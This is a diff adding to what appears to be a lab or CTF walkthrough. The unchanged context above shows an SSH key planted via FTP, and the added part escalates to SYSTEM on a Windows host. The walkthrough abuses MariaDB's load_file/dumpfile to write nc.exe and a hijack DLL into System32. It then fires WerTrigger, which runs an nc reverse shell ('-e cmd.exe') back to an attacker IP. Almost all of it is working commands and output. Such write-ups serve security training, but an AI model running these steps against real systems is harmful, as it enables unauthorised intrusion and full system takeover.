@@ -29,3 +29,59 @@ ftp> put authorized_keys
 #gaining access via SSH and our key as benoit
 ssh -i ~/.ssh/id_rsa benoit@IP
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
+
+
+#Exploiting MySQL to gain SYSTEM shell
+┌──(kali㉿kali)-[~]
+└─$ mysql -u root -h 127.0.0.1
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 8
+
+-->
+MariaDB [(none)]> select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
+
+Query OK, 1 row affected (0.227 sec)
+
+-->
+The shell.exe file was created and when we look at the permissions assigned to this newly created file, 
+we realize that we have File Write permission as SYSTEM through mysql.
+
+PS C:\test> icacls C:\test\shell.exe
+icacls C:\test\shell.exe
+C:\test\shell.exe NT AUTHORITY\SYSTEM:(I)(F)
+ BUILTIN\Administrators:(I)(F)
+ BUILTIN\Users:(I)(RX)
+Successfully processed 1 files; Failed processing 0 files
+
+PS C:\test>
+
+-->
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger
+
+-->
+MariaDB [(none)]> select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+Query OK, 1 row affected (0.292 sec)
+
+-->
+The important files we will need to execute this type of attack are Report.wer, phoneinfo.dll & WerTrigger.exe. We upload these files to the target.
+
+In the mysql shell on our kali machine, we write phoneinfo.dll to C:\Windows\System32\phoneinfo.dll :
+
+MariaDB [(none)]> select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+Query OK, 1 row affected (0.292 sec)
+
+-->
+C:\test>WerTrigger.exe
+WerTrigger.exe
+C:\test\nc.exe 192.168.213.128 445 -e cmd.exe
+
+-->
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+
